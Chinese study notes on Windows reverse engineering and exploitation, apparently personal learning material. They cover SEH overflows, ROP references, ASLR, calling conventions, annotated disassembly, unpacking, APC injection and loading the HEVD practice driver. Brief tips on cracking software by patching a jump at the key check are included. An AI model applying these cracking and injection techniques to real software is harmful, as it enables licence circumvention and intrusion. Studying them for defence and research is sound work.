\u7528\u6237\u6a21\u5757\u548c\u7cfb\u7edf\u6a21\u5757\u91cd\u5b9a\u5411\u6307\u4ee4\u5730\u5740\u95ee\u9898 \u7528\u6237\u6a21\u5757\u4e2d\u6307\u4ee4\u7684\u5730\u5740\u5728\u4e0d\u540c\u7cfb\u7edf\u4e0a\u662f\u4e0d\u53d8\u7684\uff0c\u7cfb\u7edf\u6a21\u5757\u4e2d\u6307\u4ee4\u7684\u5730\u5740\u5728\u4e0d\u540c\u7cfb\u7edf\u4e0a\u662f\u4e0d\u540c\u7684\u3002 \u5982\u679c\u4f7f\u7528\u7528\u6237\u6a21\u5757\u7684\u91cd\u5b9a\u5411\u8bed\u53e5\u7684\u5730\u5740\u4e0d\u4f1a\u6709\u4ec0\u4e48\u95ee\u9898\uff0c\u4f46\u5982\u679c\u4f7f\u7528\u7cfb\u7edf\u6a21\u5757\u4e0a\u7684\u91cd\u5b9a\u5411\u8bed\u53e5\u5730\u5740\uff0c\u8fd9\u5c31\u4f1a\u5bfc\u81f4\u672c\u5730\u6d4b\u8bd5\u6210\u529f\u7684 EIP \u5730\u5740\u5728\u76ee\u6807\u673a\u5668\u4e0a\u4e0d\u53ef\u7528\u3002 !!\u7cfb\u7edf\u6a21\u5757\u4e2d\u7684\u6307\u4ee4\u5730\u5740\u5728\u4e0d\u540c\u7cfb\u7edf\u7248\u672c\u662f\u4e0d\u540c\u7684\u3002 ROP https://cwinfosec.org/Intro-ROP-DEP-Bypass/ https://fluidattacks.com/blog/vulnserver-trun-rop/ https://ctf101.org/binary-exploitation/return-oriented-programming/ SEH\u6ea2\u51fa\u653b\u51fb https://learn.microsoft.com/zh-tw/cpp/cpp/structured-exception-handling-c-cpp?view=msvc-170 https://blog.30cm.tw/2015/05/windowsbuffer-overflowsehshellcode.html https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/seh-based-buffer-overflow SEH\u662fwindows\u4e0a\u5904\u7406\u5f02\u5e38\u7684\u673a\u5236\uff0c\u5f02\u5e38\u4f1a\u7531SEH\u94fe\u4e00\u5c42\u5c42\u8f6c\u5165\u7cfb\u7edf\u5e95\u5c42\u3002 \u5728 TIB \u4e2d\uff0c\u6709\u4e00\u4e2a ExceptionList \u94fe\u8868\uff0c\u94fe\u8868\u4e2d\u6709\u4e00\u4e2a _EXCEPTION_REGISTRATION_RECORD \u7ed3\u6784\u4f53\u3002 \u5f53\u6570\u636e\u6ea2\u51fa\u5230 _EXCEPTION_REGISTRATION_RECORD \u7684\u6307\u9488\u4e0a\u65f6\uff0c\u4f1a\u5bfc\u81f4SEH\u6ea2\u51fa\u653b\u51fb typedef struct _EXCEPTION_REGISTRATION_RECORD { struct _EXCEPTION_REGISTRATION_RECORD *Prev; PEXCEPTION_ROUTINE Handler; } EXCEPTION_REGISTRATION_RECORD; ASLR( Address Space Layout Randomization )\u5730\u5740\u7a7a\u95f4\u968f\u673a\u5316 ASLR\u4f7f\u7a0b\u5e8f\u6bcf\u6b21\u6267\u884c\u65f6\uff0c\u5185\u5b58\u4e2d\u7684\u5806\u3001\u6808BBS\u7b49\u6570\u636e\u6bcf\u6b21\u5b58\u653e\u5728\u4e0d\u540c\u7684\u5185\u5b58\u5730\u5740\uff0c\u4f7f\u5f97\u67e5\u627e\u504f\u79fb\u96be\u5ea6\u53d8\u5927\u3002 \u8c03\u7528\u7ea6\u5b9a CPU\u5728\u5904\u7406\u51fd\u6570\u4e2d\u7684\u53c2\u6570\u65f6\u7684\u4e00\u79cd\u8c03\u7528\u7ea6\u5b9a\u65b9\u6cd5\uff0c\u4e0d\u540c\u7684\u8c03\u7528\u7ea6\u5b9a\u4f7f\u7528\u7684\u5bc4\u5b58\u5668\u548c\u89c4\u5219\u4e0d\u5c3d\u76f8\u540c Fastcall Fastcall\u662fx64 Windows\u7684\u8c03\u7528\u7ea6\u5b9a\uff0cWindows\u4e0a\u7684fastcall\u9ed8\u8ba4\u4f7f\u75284\u4e2a\u5bc4\u5b58\u5668\u3002 Fast call\u7684\u5de5\u4f5c\u6a21\u5f0f - \u524d4\u4e2a\u53c2\u6570\u5728\u5bc4\u5b58\u5668\u4e2d\u4f20\u9012 - \u975e\u6d6e\u70b9\u503c(\u6d6e\u70b9\u6570\u6216\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570)\u7684\u53c2\u6570\u5c06\u901a\u8fc7RCX\u3001RDX\u3001R8\u548cR9(\u6309\u6b64\u987a\u5e8f)\u4f20\u9012\u3002\u975e\u6d6e\u70b9\u503c\u5305\u62ec\u6307\u9488\u3001\u6574\u6570\u3001\u5e03\u5c14\u503c\u3001\u5b57\u7b26\u7b49 - \u6d6e\u70b9\u53c2\u6570\u5c06\u901a\u8fc7XMM0\u3001XMM1\u3001XMM2\u548cXMM3\u4f20\u9012(\u6309\u6b64\u987a\u5e8f)\uff0c\u6d6e\u70b9\u6570\u5305\u62ec\u6d6e\u70b9\u6570\u548c\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570 - \u5982\u679c\u4f20\u9012\u7684\u53c2\u6570\u592a\u5927\uff0c\u65e0\u6cd5\u88c5\u5165\u5bc4\u5b58\u5668\uff0c\u5219\u901a\u8fc7\u5f15\u7528\u4f20\u9012 - \u53c2\u6570\u6c38\u8fdc\u4e0d\u4f1a\u5206\u5e03\u5728\u591a\u4e2a\u5bc4\u5b58\u5668\u4e2d\u3002\u5176\u4ed6\u53c2\u6570\u90fd\u653e\u5728\u6808\u4e0a\u3002 - \u57fa\u6307\u9488(base pointer, RBP)\u88ab\u4fdd\u5b58\uff0c\u4ee5\u4fbf\u6062\u590d\u3002 - \u5982\u679c\u51fd\u6570\u7684\u8fd4\u56de\u503c\u662f\u6574\u6570\u3001bool\u3001char\u7b49\uff0c\u5219\u901a\u8fc7RAX\u4f20\u9012\uff0c\u5982\u679c\u662f\u6d6e\u70b9\u6570\u6216double\uff0c\u5219\u901a\u8fc7XMM0\u4f20\u9012\u3002 - \u6210\u5458\u51fd\u6570(\u5c5e\u4e8e\u7c7b/\u7ed3\u6784\u4f53\u7684\u51fd\u6570)\u6709\u4e00\u4e2a\u8868\u793athis\u6307\u9488\u7684\u9690\u5f0f\u7b2c\u4e00\u4e2a\u53c2\u6570\u3002\u56e0\u4e3a\u5b83\u662f\u4e00\u4e2a\u6307\u9488\uff0c\u5b83\u5c06\u901a\u8fc7RCX.[1]\u4f20\u9012 - \u8c03\u7528\u8005\u8d1f\u8d23\u4e3a\u88ab\u8c03\u7528\u8005\u7684\u53c2\u6570\u5206\u914d\u7a7a\u95f4\u3002\u8c03\u7528\u8005\u5fc5\u987b\u603b\u662f\u4e3a4\u4e2a\u53c2\u6570\u5206\u914d\u7a7a\u95f4\uff0c\u5373\u4f7f\u6ca1\u6709\u4f20\u9012\u53c2\u6570\u3002 - \u5bc4\u5b58\u5668RAX\u3001RCX\u3001RDX\u3001R8\u3001R9\u3001R10\u3001R11\u88ab\u8ba4\u4e3a\u662f\u6613\u5931\u7684\uff0c\u5728\u51fd\u6570\u8c03\u7528\u65f6\u5fc5\u987b\u88ab\u8ba4\u4e3a\u662f\u88ab\u9500\u6bc1\u7684(\u9664\u975e\u6709\u5176\u4ed6\u5b89\u5168\u8bc1\u660e\u2014\u2014\u901a\u8fc7\u5206\u6790\uff0c\u5982\u6574\u4e2a\u7a0b\u5e8f\u4f18\u5316)\u3002 - \u5bc4\u5b58\u5668RBX\u3001RBP\u3001RDI\u3001RSI\u3001RSP\u3001R12\u3001R13\u3001R14\u548cR15\u88ab\u8ba4\u4e3a\u662f\u975e\u6613\u5931\u7684\uff0c\u5fc5\u987b\u901a\u8fc7\u4f7f\u7528\u5b83\u4eec\u7684\u51fd\u6570\u6765\u4fdd\u5b58\u548c\u6062\u590d \u51fd\u6570\u4e2d\u53c2\u6570\u7684\u4f20\u9012\u987a\u5e8f\u5982\u4e0b MOV DWORD PTR SS:[RSP + 0x38], 0x8 ;\u540c\u7406 MOV DWORD PTR SS:[RSP + 0x30], 0x7 ;\u540c\u7406 MOV DWORD PTR SS:[RSP + 0x28], 0x6 ;\u7b2c\u516d\u4e2a\u53c2\u6570\u4f20\u7ed9DWORD\u6307\u9488\uff0c\u7531\u4e8e\u662f\u53cc\u5b57\uff0c\u6240\u4ee5RSP\u5730\u5740\u662fRSP+0X28 MOV DWORD PTR SS:[RSP + 0x20], 0x5 ;\u7b2c\u4e94\u4e2a\u53c2\u6570\u4f20\u7ed9DWORD\u6307\u9488\uff0c\u5730\u5740\u662fRSP+0X20 MOV R9D, 0x4 ;\u7b2c\u56db\u4e2a\u53c2\u6570\u7ed9R9D MOV R8D, 0x3 ;\u7b2c\u4e09\u4e2a\u53c2\u6570\u7ed9R8D MOV EDX, 0x2 ;\u7b2c\u4e8c\u4e2a\u53c2\u6570\u7ed9EDX MOV ECX, 0x1 ;\u7b2c\u4e00\u4e2a\u53c2\u6570\u7ed9ECX CALL function cdecl cdecl\u662fC\u8bed\u8a00\u8c03\u7528\u7ea6\u5b9a windows x86\u662f\u7528cdecl\u8c03\u7528\u7ea6\u5b9a - \u53c2\u6570\u5728\u6808\u4e0a\u5411\u540e\u4f20\u9012(\u4ece\u53f3\u5230\u5de6),\u4f9d\u7167\u6808\u5148\u5165\u540e\u51fa\u7684\u89c4\u77e9\uff0c\u5148\u4f20\u9012\u6700\u540e\u7684\u53c2\u6570\uff0c\u597d\u8ba9\u524d\u9762\u7684\u53c2\u6570\u5148\u51fa\u6765\u3002\u4e0d\u4f7f\u7528\u5bc4\u5b58\u5668 - \u57fa\u6307\u9488(base pointer, RBP)\u88ab\u4fdd\u5b58\uff0c\u4ee5\u4fbf\u6062\u590d\u3002 - \u8fd4\u56de\u503c\u901a\u8fc7EAX\u4f20\u9012\uff0c\u5982\u679c\u662f\u8fd4\u56de\u503c\u662f\u5b57\u8282\u6216\u5b57\u7b26\u90e8\u5206\uff0c\u5219\u4f7f\u7528EAX\u66f4\u4f4e\u4f4d\u8fd4\u56de - \u8c03\u7528\u8005\u6e05\u9664\u5806\u6808\u3002\u8fd9\u5c31\u662fcdecl\u7684\u7279\u522b\u4e4b\u5904\u3002\u56e0\u4e3a\u8c03\u7528\u8005\u4f1a\u6e05\u9664\u5806\u6808\uff0c\u6240\u4ee5cdecl\u5141\u8bb8\u53ef\u53d8\u6570\u91cf\u7684\u53c2\u6570\u3002 - 32\u4f4d\u7684x86\uff0c\u5728\u6808\u4e0a\u4f20\u53c2 - linux\u4e0a64\u4f4d\u7684x86\uff0cRDI\u3001RSI\u3001RDX\u3001RCX\u3001R8\u548cR9\u4e2d\u6309\u987a\u5e8f\u653e\u7f6e\u6700\u591a6\u4e2a\u53c2\u6570\uff0c\u5176\u4f59\u53c2\u6570\u5728\u6808\u4e0a - stdcall Standard Calling\u6807\u51c6\u8c03\u7528\u7ea6\u5b9a\uff0c\u572832\u4f4d\u7684dll\u6587\u4ef6\u4e2d\u4f7f\u7528\u7684\u662f\u8fd9\u79cd - \u53c2\u6570\u4ece\u53f3\u5230\u5de6\u5728\u6808\u4e0a\u4f20\u9012\uff0c\u4e0d\u9002\u7528\u5bc4\u5b58\u5668 - \u88ab\u8c03\u7528\u51fd\u6570\u6e05\u9664\u6808\uff0c\u53ea\u80fd\u5141\u8bb8\u56fa\u5b9a\u6570\u91cf\u53c2\u6570\u7684\u51fd\u6570 \u7b80\u5355exe\u5206\u6790 Printf\u51fd\u6570 \u901a\u8fc7\u5b57\u7b26\u4e32\u5b9a\u4f4d\u5230\u51fd\u6570\u4f4d\u7f6e\uff0c\u672c\u4f8b\u4e2d\u77e5\u9053Hello Word\u5b57\u7b26\u4e32\u5c31\u662fmain\u51fd\u6570\u4e2d\u7684 \u901a\u8fc7xAnalyzer\u63d2\u4ef6\u53ef\u4ee5\u5206\u6790\u51fa\u51fd\u6570\u4f4d\u7f6e\uff0c\u5e26 $ \u5e76\u4e0b\u9762\u6709\u6bb5\u62ec\u53f7\u7684\u5c5e\u4e8e\u51fd\u6570\u6bb5 SUB RSP,0x28 //RSP\u51cf\u4e86\u4e00\u4e2a\u503c\u3002\u5c5e\u4e8e\u51fd\u6570\u5e8f\u8a00 LEA RCX,QWORD PTR DS:[0x7FF6FA32E430] //\u5c060x7FF6FA32E430\u5730\u5740\u6307\u5230RCX\uff0c\u5728Fastcall\u4e2d\uff0cRCX\u662f\u7528\u4e8e\u7ed9\u51fd\u6570\u4f20\u53c2\u7684\u7b2c\u4e00\u4e2a\u503c\u3002\u5728\u8fd9\u91cc\u662f\u5c06Hello Word\u4f20\u7ed9\u4e86printf CALL <consoleapplication2.sub_7FF6FA311010> //\u8c03\u7528\u51fd\u6570\uff0c\u8fd9\u91cc\u662fprintf\u51fd\u6570 XOR EAX,EAX //\u5f02\u6216EAX\uff0c\u5f02\u6216\u81ea\u8eab\u7ed3\u679c\u4e3a0 ADD RSP,0x28 //\u8fd8\u539f\u6808 RET //\u8fd4\u56de\u8c03\u7528,main\u51fd\u6570\u7ed3\u679c \u5faa\u73af EBX/RBX\u662f\u5faa\u73af\u7684\u7279\u5f81 \u5982\u56fe\u6240\u793a - \u5faa\u73af\u4ece0\u5f00\u59cb\uff0cEBX\u88ab\u5f02\u6216\u62100 - EBX\u4e3a\u5faa\u73af\u7d22\u5f15\uff0c\u4e14\u4f20\u7ed9\u4e86EDX\uff0c\u4e3a\u51fd\u6570\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570 - \u4e00\u4e2a\u5b57\u7b26\u4e32\u7684\u5730\u5740\u6307\u5230\u4e86RCX\uff0c\u4e3a\u51fd\u6570\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570 - \u8c03\u7528\u4e86printf\u51fd\u6570 - EBX\u9012\u589e1 - CMP\u6bd4\u8f830xA(10)\u548cEBX(\u6b64\u65f6\u4e3a1)\uff0cEBX = EBX - 0xA - JL\u6839\u636eS\u6807\u5fd7\u4f4d\u8df3\u8f6c\uff0c\u7531\u4e8e\u4e0a\u4e00\u6b65\u7ed3\u679c\u662f1-10\u4e3a\u8d1f\u6570\uff0c\u6240\u4ee5SF\u4e3a1\uff0c\u5219\u8df3\u8f6c \u7b80\u5355DLL\u5206\u6790 \u8fd9\u662f\u6b64dll\u4e2d\u7684\u5bfc\u5165\u51fd\u6570 \u4fee\u9970\u51fd\u6570 dll\u7684\u5bfc\u51fa\u51fd\u6570\u4e2d\uff0c\u5e26\u6709 @ \u3001 ? \u7684\u90fd\u662f\u4fee\u9970\u51fd\u6570\uff0c\u5982\u679c\u4e00\u4e2a\u51fd\u6570\u6ca1\u6709\u88ab\u4fee\u9970\uff0c\u90a3\u4ed6\u662fC\u51fd\u6570\u6216\u8005\u4f7f\u7528 extern \"C\" \u7533\u660e\u4e86\u662fC\u51fd\u6570\u3002 \u4fee\u9970\u51fd\u6570\u7684\u597d\u5904\u662f\u53ef\u4ee5\u770b\u5230\u8fd4\u56de\u7c7b\u578b\u548c\u53c2\u6570 \u8c03\u7528SayHello \u5bf9\u5e94\u52a0\u8f7d\u7684exe #include <iostream> #include <Windows.h> typedef void(WINAPI* aa)(void); //\u5b9a\u4e49\u4e00\u4e2a\u51fd\u6570\u7c7b\u578b\u4ee5\u4f9b\u4f7f\u7528 int main() { HMODULE dll = LoadLibraryA(\"DLL.DLL\"); //\u8f7d\u5165dll if (dll != NULL) { aa aa1 = (aa)GetProcAddress(dll, \"SayHello\"); //\u4ecedll\u53e5\u67c4\u52a0\u8f7dSayHello\u51fd\u6570\u7684\u5730\u5740\uff0c\u5e76\u4f20\u7ed9\u81ea\u5b9a\u4e49\u51fd\u6570aa1 if (aa1 != NULL) { aa1(); //\u8c03\u7528aa1\uff0c\u4e5f\u5c31\u662f\u8c03\u7528dll\u4e2d\u7684SayHello } else { printf(\"Can't load the function.\"); } } } PrintArray test edx,edx ;edx\u4e0e\u81ea\u8eab\u8fdb\u884cAND\u6bd4\u8f83 jle dll.7FF960511F18 ;jle\u67e5\u770b\u6807\u5fd7\u4f4d\uff0cZF\u4e3a1\u4e5f\u5c31\u662fedx\u662f0\u7684\u60c5\u51b5\u4e0b\u8df3\u8f6c\u5230ret\uff0c\u7ed3\u675f\u51fd\u6570 mov qword ptr ss:[rsp+0x10],rsi ;RSI\u8d4b\u7ed9rsp+0x10\u5730\u5740 push rdi ;\u5165\u6808 sub rsp,0x20 ;\u51fd\u6570\u5e8f\u8a00 mov qword ptr ss:[rsp+0x30],rbx ;RBX\u88ab\u5b58\u5230RSP+0x30\u4f4d\u7f6e mov rsi,rcx ;\u7b2c\u4e00\u4e2a\u51fd\u6570\u53c2\u6570RCX\u4f20\u9012\u7ed9RSI xor ebx,ebx ;EBX\u7f6e0 movsxd rdi,edx ;\u7b2c\u4e8c\u4e2a\u53c2\u6570EDX\u4f20\u9012\u7ed9RDI mov edx,dword ptr ds:[rsi+rbx*4] ;rsi+rbx*4\u5730\u5740\u4f20\u7ed9edx call <dll.sub_7FF9605120B0> ;\u8c03\u7528\u51fd\u6570\uff0c\u8fd9\u662fstd::cout call <dll.sub_7FF960514DD0> ;\u8c03\u7528\u51fd\u6570\uff0c\u8fd9\u662fstd::end inc rbx ;rbx\u81ea\u52a01 cmp rbx,rdi ;\u6bd4\u8f83rbx\u548crdi\uff0crdi\u7684\u503c\u662f\u7b2c\u4e8c\u4e2a\u53c2\u6570\u7684\u503c jl dll.7FF960511EA0 ;rbx\u5c0f\u4e8e\u7b2c\u4e8c\u4e2a\u53c2\u6570\u5219\u8df3\u8f6c InitializePlayer mov dword ptr ds:[rcx],0x20 ;0x20\u79fb\u52a8\u5230rcx\uff0crcx\u662f\u7b2c\u4e00\u4e2a\u53c2\u6570 lea rdx,qword ptr ds:[0x7FF960549718] ;\u8fd9\u662f\u4e2a\u5b57\u7b26\u4e32\uff0c\u5730\u5740\u8d4b\u7ed9\u4e86rdx\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570 \u7834\u89e3\u8f6f\u4ef6\u7684\u8981\u70b9 - \u7b80\u5355\u52a0\u5bc6\u7684\u8f6f\u4ef6\u901a\u5e38\u53ef\u4ee5\u5728\u627e\u5230\u5173\u952e\u51fd\u6570\u540e\uff0c\u91c7\u7528JMP\u7834\u89e3 - \u91c7\u7528\u8054\u7f51\u8ba4\u8bc1\u7684\u8f6f\u4ef6\uff0c\u9700\u8981\u627e\u5230\u4fdd\u62a4\u51fd\u6570 \u8131\u58f3 \u52a0\u58f3\u7684\u7279\u70b9 - \u8f83\u9ad8\u7684\u71b5\uff08\u5927\u4e8e\u7b49\u4e8e7\uff09 - \u8f83\u5c11\u7684\u5bfc\u5165\u51fd\u6570 - \u7279\u5b9a\u6253\u5305\u5668\u7684\u6807\u8bc6 \u6839\u636e\u5185\u5b58\u5206\u914d\u8c03\u7528\u548c\u5185\u5b58\u5c5e\u6027\u66f4\u6539\u8c03\u7528\u624b\u52a8\u627e\u5230\u6253\u5305\u540e\u7684\u4ee3\u7801\u6216\u63d0\u53d6shellcode \u6982\u5ff5&\u672f\u8bed UIPI (User Interface Privilege Isolation) \u5168\u79f0\u7528\u6237\u754c\u9762\u6743\u9650\u9694\u79bb\uff0c\u5728Windows 2008\u540e\u5f15\u5165\uff0c\u7981\u6b62\u4f4e\u6743\u9650\u8fdb\u7a0b\u5229\u7528\u6d88\u606f\u673a\u5236\u5bf9\u9ad8\u6743\u9650\u8fdb\u7a0b\u8fdb\u884c\u4efb\u610f\u64cd\u4f5c\u3002 \u8be5\u8bbe\u7f6e\u9ed8\u8ba4\u5f00\u542f\uff0c\u4f4d\u4e8e\u6ce8\u518c\u8868 HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System EnableUIPI\u9879\u4e3a0\u8868\u793a\u7981\u7528\u529f\u80fd SSPI (Security Support Provider Interface) \u5b89\u5168\u652f\u6301\u63d0\u4f9b\u7a0b\u5e8f\u63a5\u53e3\uff0c\u53ef\u5e2e\u52a9\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u5efa\u7acb\u548c\u7ef4\u62a4\u5b89\u5168\u901a\u9053\uff0c\u63d0\u4f9b\u673a\u5bc6\u6027\u3001\u5b8c\u6574\u6027\u548c\u8eab\u4efd\u9a8c\u8bc1\u3002 Bit & Bytes Bit\uff1a0 or 1 Nibble: 4 bits Byte: 8 bits Word: 2 bytes, 16 bits DWORD: 4 bytes, 32 bits QWORD: 8 bytes, 64 bits \u4e8c\u8fdb\u5236\u8fd0\u7b97 NOT \u975e AND \u4e14 OR \u6216 XOR \u5f02\u6216\uff0c\u76f8\u540c\u4e3a0\uff0c\u4e0d\u540c\u4e3a1 \u8fd0\u884c\u5e93&\u51fd\u6570 _set_app_type \u5728\u542f\u52a8\u65f6\u4f7f\u7528\u7684\u5185\u90e8\u51fd\u6570\u544a\u77e5 CRT\uff0c\u5e94\u7528\u5c5e\u4e8e\u63a7\u5236\u53f0\u5e94\u7528\u7a0b\u5e8f\u8fd8\u662f GUI \u5e94\u7528\u3002 controlfp \u7528\u6765\u8bbe\u7f6e\u6216\u8005\u67e5\u8be2\u6d6e\u70b9\u73af\u5883\u7684\u63a7\u5236\u4f4d\uff0c\u4f8b\u5982\u820d\u5165\u6a21\u5f0f\u3001\u5f02\u5e38\u5904\u7406\u65b9\u5f0f\u7b49 _iob_func \u6807\u51c6\u8f93\u5165/\u8f93\u51fa\u6d41\u76f8\u5173 _InterlockedCompareExchange64 \u5bf9\u6570\u636e\u8fdb\u884c\u539f\u5b50\u6bd4\u8f83\u7684\u51fd\u6570\uff0c\u786e\u4fdd\u6570\u636e\u4e0d\u4f1a\u88ab\u6539\u53d8 LONG64 _InterlockedCompareExchange64(LONG64 volatile* Destination, LONG64 Exchange, LONG64 Comparand); \u5f53\u7b2c\u4e00\u4e2a\u53c2\u6570Destination\u7b49\u4e8e\u7b2c\u4e09\u4e2a\u53c2\u6570Comparand\u65f6\uff0c\u5c06\u7b2c\u4e00\u4e2a\u53c2\u6570\u66ff\u6362\u4e3a\u7b2c\u4e8c\u4e2a\u53c2\u6570Exchange\u3002 \u786e\u4fddDestination\u7684\u503c\u548cExchange\u76f8\u7b49 SEH __except \u5f02\u5e38\u8fc7\u6ee4\u5668\u7684\u8fd4\u56de\u503c EXCEPTION_EXECUTE_HANDLER //EXCEPTION_EXECUTE_HANDLER\u7684\u8fd4\u56de\u503c\u5411SEH\u53d1\u51fa\u4fe1\u53f7\uff0c\u4ee5\u6267\u884c__except\u5757\u4e2d\u7684\u4ee3\u7801\u3002 EXCEPTION_CONTINUE_SEARCH //EXCEPTION_CONTINUE_SEARCH\u7684\u8fd4\u56de\u503c\u5411SEH\u53d1\u51fa\u4fe1\u53f7\uff0c\u8ba9\u5b83\u7ee7\u7eed\u5728\u5176\u4ed6\u5730\u65b9\u641c\u7d22\u5904\u7406\u7a0b\u5e8f //\u5f53\u5904\u7406\u7a0b\u5e8f\u8fd4\u56deExceptionContinueSearch\u65f6\uff0c\u8fd9\u610f\u5473\u7740\u5904\u7406\u7a0b\u5e8f\u5bf9\u5f53\u524d\u5f02\u5e38\u7684\u6062\u590d\u4e0d\u611f\u5174\u8da3\u3002\u56e0\u6b64\uff0c\u64cd\u4f5c\u7cfb\u7edf\u5c06\u8f6c\u5230\u4e0b\u4e00\u4e2a_EXCEPTION_REGISTRATION_RECORD\u5e76\u6267\u884c\u5176\u5904\u7406\u7a0b\u5e8f\u3002 //\u5982\u679c\u6240\u6709\u5904\u7406\u7a0b\u5e8f\u4e0d\u4f1a\u7ba1\u7406\u5f53\u524d\u5f02\u5e38,\u64cd\u4f5c\u7cfb\u7edf\u5c06\u8c03\u7528\u5f53\u524d\u672a\u5904\u7406\u7684\u5f02\u5e38\u8fc7\u6ee4\u5668\u3002\u5f00\u53d1\u4eba\u5458\u53ef\u80fd\u4f1a\u8c03\u7528UnhandledExceptionFilter()API\u5b89\u88c5\u81ea\u5b9a\u4e49\u8fc7\u6ee4\u5668\u3002\u4f46\u662f,\u8bf7\u6ce8\u610f,\u672a\u5904\u7406\u7684\u5f02\u5e38\u8fc7\u6ee4\u5668()\u5e76\u4e0d\u662f\u524d\u9762\u63d0\u5230\u7684\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u5217\u8868\u7684\u4e00\u90e8\u5206\u3002\u4e5f\u5c31\u662f\u8bf4,\u6ca1\u6709_exception _register _register _record\u7ed3\u6784,\u5b83\u5c06\u6307\u5411\u8fd9\u4e2a\u51fd\u6570 EXCEPTION_CONTINUE_EXECUTION //EXCEPTION_CONTINUE_EXECUTION\u7684\u8fd4\u56de\u503c\u5411SEH\u53d1\u51fa\u4fe1\u53f7\uff0c\u8ba9\u5b83\u91cd\u65b0\u6267\u884c\u5bfc\u81f4\u5f02\u5e38\u7684\u76f8\u540c\u4ee3\u7801(\u5728\u6211\u4eec\u7684\u793a\u4f8b\u4e2d\uff0c\u8fd9\u662f\u9664\u6cd5\u4ee3\u7801)\u3002 SEH\u662f\u57fa\u4e8e\u7ebf\u7a0b\u7684 TIB\u4e2d\u7684\u7ed3\u6784 typedef struct _NT_TIB { struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; //\u7b2c\u4e00\u4e2a\u6210\u5458\u6307\u5411_EXCEPTION_REGISTRATION_RECORD\u7ed3\u6784\u7684\u6307\u9488 PVOID StackBase; PVOID StackLimit; PVOID SubSystemTib; #if defined(_MSC_EXTENSIONS) union { PVOID FiberData; DWORD Version; }; #else PVOID FiberData; #endif PVOID ArbitraryUserPointer; struct _NT_TIB *Self; } NT_TIB; typedef NT_TIB *PNT_TIB; _EXCEPTION_REGISTRATION_RECORD \u7684\u4e00\u4e2a\u6210\u5458\u662f\u4e0b\u4e00\u4e2a _EXCEPTION_REGISTRATION_RECORD \u7684\u6307\u9488\u3002 _EXCEPTION_REGISTRATION_RECORD \u662f\u5f02\u5e38\u5904\u7406\u7684\u94fe\u8868 typedef struct _EXCEPTION_REGISTRATION_RECORD { struct _EXCEPTION_REGISTRATION_RECORD *Next; PEXCEPTION_ROUTINE Handler; } EXCEPTION_REGISTRATION_RECORD; \u5f53\u53d1\u751f\u5f02\u5e38\u65f6\uff0c\u64cd\u4f5c\u7cfb\u7edf\u67e5\u770b\u53d1\u751f\u6545\u969c\u7684\u7ebf\u7a0b\u7684TIB\uff0c\u5e76\u68c0\u7d22\u4e00\u4e2a\u6307\u5411TIB\u4e2d\u5305\u542b\u7684_EXCEPTION_REGISTRATION_RECORD\u7ed3\u6784\u7684\u6307\u9488\u3002\u7136\u540e\uff0c\u64cd\u4f5c\u7cfb\u7edf\u5bfc\u822a\u5230EXCEPTION_ROUTINE\u4f8b\u7a0b\u7684\u94fe\u8868\uff0c\u5e76\u786e\u5b9a\u8fd9\u4e9b\u4f8b\u7a0b\u4e2d\u662f\u5426\u6709\u4efb\u4f55\u4f8b\u7a0b\u5c06\u5904\u7406\u5f02\u5e38 APC APC(\u5f02\u6b65\u8fc7\u7a0b\u8c03\u7528)\u662f\u4e00\u79cd\u673a\u5236\uff0c\u53ef\u4ee5\u5728Windows\u4e2d\u7528\u4e8e\u5728\u7279\u5b9a\u7ebf\u7a0b\u7684\u4e0a\u4e0b\u6587\u4e2d\u6392\u961f\u5b8c\u6210\u4f5c\u4e1a\u3002 \u5f53\u8c03\u7528\u5f02\u6b65RPC\u65b9\u6cd5\u65f6\uff0c\u53ef\u4ee5\u6307\u5b9a\u4e00\u4e2aAPC\u4f8b\u7a0b\u7684\u5730\u5740\uff0c\u8be5\u4f8b\u7a0b\u5c06\u5728RPC\u65b9\u6cd5\u5b8c\u6210\u65f6\u6267\u884c\u3002 \u7528\u6237\u6a21\u5f0f\u4e0b\u7684\u4e24\u79cdAPC - \u7528\u6237APC:\u666e\u901a\u7c7b\u578b\u7684\u7528\u6237APC\uff0c\u4ec5\u5728\u7ebf\u7a0b\u5904\u4e8eAlertable\u72b6\u6001\u65f6\u8fd0\u884c - \u7279\u6b8a\u7528\u6237APC: RS5(windows10 October 2018)\u4e2d\u6dfb\u52a0\u7684\u4e00\u79cd\u76f8\u5bf9\u8f83\u65b0\u7684APC\u7c7b\u578b\uff0c\u5f3a\u5236\u7ebf\u7a0b\u8fdb\u5165Alertable\u3002(MS\u5c1a\u672a\u8bc1\u5b9e) \u7528\u6237\u6a21\u5f0f\u4e0b\uff0c\u53ea\u6709\u5f53\u7ebf\u7a0b\u5904\u4e8e Alertable \u3001 NtTestAlert(\u6d4b\u8bd5) \u72b6\u6001\u65f6\uff0c\u624d\u4f1a\u89e6\u53d1APC\uff0c\u4f7f\u7528APC\u6ce8\u5165\uff0c\u9700\u8981\u8ba9\u8fdb\u7a0b\u5904\u4e8e\u4ee5\u4e0a\u72b6\u6001\u3002 \u7279\u6b8a\u7528\u6237APC\u4f7f\u7528 NtQueueApcThreadEx \u3001 NtQueueApcThreadEx2 \u5185\u6838\u5b66\u4e60 HEVD\u9a71\u52a8\u7ec3\u4e60 \u901a\u8fc7\u8f93\u5165\u8f93\u51fa\u63a7\u5236 \uff08IOCTL\uff09 \u8bbf\u95ee\u8bbe\u5907\u9a71\u52a8\u7a0b\u5e8f\u3002 \u4f7f\u7528 DeviceIoControl() \u51fd\u6570\u5411\u9a71\u52a8\u5bf9\u8c61\u53d1\u9001\u6d88\u606f\u3002 \u5b89\u88c5\u9a71\u52a8\u3002\u7531\u4e8e\u662f\u65e0\u7b7e\u540d\u7684\uff0cWindows\u4f1a\u963b\u6b62\u542f\u52a8\u9a71\u52a8\uff0c\u9700\u8981\u5728Windows debug\u6a21\u5f0f\u4e0b\u542f\u52a8 sc create HEVD binPath= C:\\Users\\admin\\Desktop\\x64\\HEVD.sys type= kernel sc start HEVD \u9a71\u52a8\u5df2\u52a0\u8f7d 0x800 